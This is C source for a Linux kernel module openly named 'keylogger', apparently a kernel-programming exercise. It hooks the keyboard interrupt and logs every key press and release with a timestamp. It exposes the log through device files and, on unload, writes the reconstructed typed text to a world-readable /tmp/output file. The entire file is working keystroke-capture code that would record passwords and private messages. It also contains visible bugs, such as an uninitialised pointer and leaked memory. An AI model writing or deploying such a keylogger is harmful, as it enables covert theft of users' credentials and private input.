#include "keylog.h"
#include "keymap.h"
#include <linux/mutex.h>
#include <linux/list_sort.h>

#define KEYBOARD_IRQ	1
#define SHIFT_L		42
#define SHIFT_R		54
#define CAPS_LOCK	58
#define MAX_KEYS	120

#define	MODULE_NAME		"keylogger"
#define	MODULE_STATS_NAME	"stats_keylogger"
#define FILENAME		"/tmp/output"
#define BUF_SIZE		PAGE_SIZE
/*
static struct s_stroke {
	unsigned char		key;
	unsigned char		state;
	char			*name;
	char			value;
	struct tm		time;
	struct list_head	stroke_lst;
};

struct keyboard_map {
  int   key;
  int   ascii;
  char  *str;
  int   ascii_shift;
  char  *shift_str;
  bool  pressed;
};

*/

struct s_keyboard_map_lst {
  	int	key;
  	int	ascii;
  	char	*str;
  	size_t	nb_pressed;
  	size_t	nb_released;
	struct list_head	map_lst;
};
DEFINE_SPINLOCK(mr_lock);

enum {
	RELEASED,
	PRESSED
};

//struct list_head	head_stroke_lst_head;
struct proc_dir_entry	*entry;
bool 			shift = 0;
bool 			caps_lock = 0;

LIST_HEAD(head_stroke_lst);
LIST_HEAD(head_keymap_lst);

int cmp_pressed(void *priv, struct list_head *a, struct list_head *b)
{
	struct s_keyboard_map_lst		*a_stroke = NULL;
	struct s_keyboard_map_lst		*b_stroke = NULL;

	a_stroke = list_entry(a, struct s_keyboard_map_lst, map_lst);
	b_stroke = list_entry(b, struct s_keyboard_map_lst, map_lst);
	return a_stroke->nb_pressed < b_stroke->nb_pressed ? 1 : 0;
}

int cmp_released(void *priv, struct list_head *a, struct list_head *b)
{
	struct s_keyboard_map_lst		*a_stroke = NULL;
	struct s_keyboard_map_lst		*b_stroke = NULL;

	a_stroke = list_entry(a, struct s_keyboard_map_lst, map_lst);
	b_stroke = list_entry(b, struct s_keyboard_map_lst, map_lst);
	return a_stroke->nb_released < b_stroke->nb_released ? 1 : 0;
}

int stats_show(struct seq_file *seq_file, void *p)
{
	struct s_keyboard_map	entry;
	struct s_keyboard_map_lst	*keymap_iter = NULL;
	struct s_keyboard_map_lst	*keymap_elem = NULL;
	int i;
	int j;

	j = 0;
	for (i = 0; i < MAX_KEYS; ++i) {
		keymap_elem = kmalloc(sizeof(struct s_keyboard_map_lst ), GFP_ATOMIC);
		entry = keyboard_mapping[i];
		keymap_elem->key = entry.key;
		keymap_elem->ascii = entry.ascii;
		keymap_elem->str = entry.str;
		keymap_elem->nb_pressed = entry.nb_pressed;
		keymap_elem->nb_released = entry.nb_released;
		list_add(&(keymap_elem->map_lst), &head_keymap_lst);
	}
	list_sort(NULL, &head_keymap_lst, cmp_pressed);
	seq_printf(seq_file, "TOP 3 PRESSED KEYS\n");
	list_for_each_entry(keymap_iter, &head_keymap_lst, map_lst)
	{
		if (keymap_iter->nb_pressed != 0 && j < 3) {
			seq_printf(seq_file, "%s (%d) - %li times\n",
				   keymap_iter->str,
				   keymap_iter->key,
			   	   keymap_iter->nb_pressed);
			++j;
		}
	}
	j = 0;
	seq_printf(seq_file, "TOP 3 RELEASED KEYS\n");
	list_sort(NULL, &head_keymap_lst, cmp_released);
	list_for_each_entry(keymap_iter, &head_keymap_lst, map_lst)
	{
		if (keymap_iter->nb_pressed != 0 && j < 3) {
			seq_printf(seq_file, "%s (%d) - %li times\n",
				   keymap_iter->str,
				   keymap_iter->key,
			   	   keymap_iter->nb_released);
			++j;
		}
		kfree(keymap_iter);
	}
	return 0;
}



int keylog_show(struct seq_file *seq_file, void *p)
{
	struct s_stroke	*strokes = NULL;

	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		seq_printf(seq_file, "%.2i:%.2i:%.2i: %s (%d) %s - %li\n",
			   strokes->time.tm_hour,
			   strokes->time.tm_min,
			   strokes->time.tm_sec,
			   strokes->name,
			   strokes->key,
			   strokes->state == RELEASED ? "RELEASED" : "PRESSED",
			   strokes->state ? keyboard_mapping[strokes->key].nb_pressed : keyboard_mapping[strokes->key].nb_released
			   );
	}
	return 0;
}

static int keylog_open(struct inode *inode, struct file *file)
{
	int ret;

	spin_lock(&mr_lock);
	file->private_data = NULL;
	ret = single_open(file, &keylog_show, NULL);
	spin_unlock(&mr_lock);
	return ret; 
}

static ssize_t	keylog_write(struct file *file, const char __user *buf,
			  size_t size, loff_t *offset)
{
	return 0;
}

static ssize_t keylog_read(struct file *file, char __user *buf, size_t size,
			 loff_t *offset)
{
	int	ret;

	spin_lock(&mr_lock);
	ret = seq_read(file, buf, size, offset);
	spin_unlock(&mr_lock);
	return ret;
}

static int keylog_release(struct inode *inode, struct file *file)
{
	int	ret;

	spin_lock(&mr_lock);
	ret = single_release(inode, file);
	spin_unlock(&mr_lock);
	return ret;
}

static struct file_operations const keylog_file_fops = {
	.owner		= THIS_MODULE,
	.open = keylog_open,
	.write = keylog_write,
	.read = keylog_read,
	.release = keylog_release,
	.llseek = seq_lseek,
};

static struct miscdevice		keylog_dev = {
	MISC_DYNAMIC_MINOR,
	MODULE_NAME,
	&keylog_file_fops
};

static int stats_open(struct inode *inode, struct file *file)
{
	int ret;

	spin_lock(&mr_lock);
	file->private_data = NULL;
	ret = single_open(file, &stats_show, NULL);
	spin_unlock(&mr_lock);
	return ret; 
}

static ssize_t	stats_write(struct file *file, const char __user *buf,
			  size_t size, loff_t *offset)
{
	return 0;
}

static ssize_t stats_read(struct file *file, char __user *buf, size_t size,
			 loff_t *offset)
{
	int	ret;

	spin_lock(&mr_lock);
	ret = seq_read(file, buf, size, offset);
	spin_unlock(&mr_lock);
	return ret;
}

static int stats_release(struct inode *inode, struct file *file)
{
	int	ret;

	spin_lock(&mr_lock);
	ret = single_release(inode, file);
	spin_unlock(&mr_lock);
	return ret;
}

static struct file_operations const stats_file_fops = {
	.owner =	THIS_MODULE,
	.open =		stats_open,
	.write =	stats_write,
	.read =		stats_read,
	.release =	stats_release,
	.llseek =	seq_lseek,
};

static struct miscdevice		stats_dev = {
	MISC_DYNAMIC_MINOR,
	MODULE_STATS_NAME,
	&stats_file_fops
};


static void fill_stroke(struct s_stroke *new, struct s_keyboard_map *entry,
		        struct timespec ts, unsigned char scancode)

{
	new->key =  scancode & 0x7f;
	entry = &keyboard_mapping[new->key];
	new->name =  entry->str;
	new->state = (scancode & 0x80) ? RELEASED : PRESSED;
	entry->pressed = new->state == PRESSED ? true : false;
	if (entry->pressed)
		entry->nb_pressed += 1;
	else
		entry->nb_released += 1;
	caps_lock = entry->pressed && new->key == CAPS_LOCK ? !caps_lock : caps_lock;
	shift = keyboard_mapping[SHIFT_R].pressed | keyboard_mapping[SHIFT_L].pressed;
	if (isalpha(entry->ascii))
		new->value = shift == caps_lock ? entry->ascii : entry->shift_ascii; 
	else
		new->value = shift ? entry->shift_ascii : entry->ascii; 
	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
	list_add(&new->stroke_lst, &head_stroke_lst);

}
static irqreturn_t keyboard_handler (int irq, void *dev_id)
{
	struct s_stroke		*new;
	struct timespec ts;
	struct s_keyboard_map	*entry;
	static unsigned char scancode;

	getnstimeofday(&ts);
	spin_lock(&mr_lock);
	scancode = inb (0x60);
	spin_unlock(&mr_lock);
	new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC);
	if (new) 
		fill_stroke(new, entry, ts, scancode);
	return IRQ_HANDLED;
}

static int __init keyboard_irq_init(void)
{
	int ret;

	ret = misc_register(&keylog_dev);
	if (ret < 0) 
		return -ENOMEM;
	ret = misc_register(&stats_dev);
	if (ret < 0) 
		return -ENOMEM;
	ret = request_irq(KEYBOARD_IRQ, keyboard_handler, IRQF_SHARED,
			"keyboard", (void *)keyboard_handler);
	if (ret) {
		pr_err("can't get shared interrupt for keyboard\n");
		return -1;
	}
	printk (KERN_ERR "init okay!\n");
	return 0;
}

static void write_file(int fd)
{
	char			*output;
	struct s_stroke		*strokes = NULL;
	struct file		*file = NULL;
 	loff_t			pos = 0;

	output = kmalloc(BUF_SIZE, GFP_KERNEL);
	memset(output, 0, PAGE_SIZE);
	list_for_each_entry_reverse(strokes, &head_stroke_lst, stroke_lst)
	{
		if (strokes->state == PRESSED) {
			if (isprint(strokes->value)) {
				output[strlen(output)] = strokes->value;
			}
			if (strokes->value == 13) {
				sys_write(fd, output, strlen(output));
				file = fget(fd);
				if (file) {
					vfs_write(file, output, strlen(output), &pos);
					fput(file);
				}
				memset(output, 0, PAGE_SIZE);
			}
		}
		kfree(strokes);
	}
//	pr_err("%s\n", output);
	kfree(output);
	sys_close(fd);
}

static void __exit keyboard_irq_exit(void)
{
	int			fd;
	
	mm_segment_t old_fs = get_fs();
	set_fs(KERNEL_DS);
	
	fd = sys_open(FILENAME, O_WRONLY | O_CREAT | O_TRUNC, 0644);
  	if (fd >= 0)
		write_file(fd);
 	set_fs(old_fs);
	misc_deregister(&keylog_dev);
	misc_deregister(&stats_dev);
	free_irq(KEYBOARD_IRQ, (void *)(keyboard_handler));
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("abonneca");
MODULE_DESCRIPTION("A keyboard irq module");

module_init(keyboard_irq_init);
module_exit(keyboard_irq_exit);
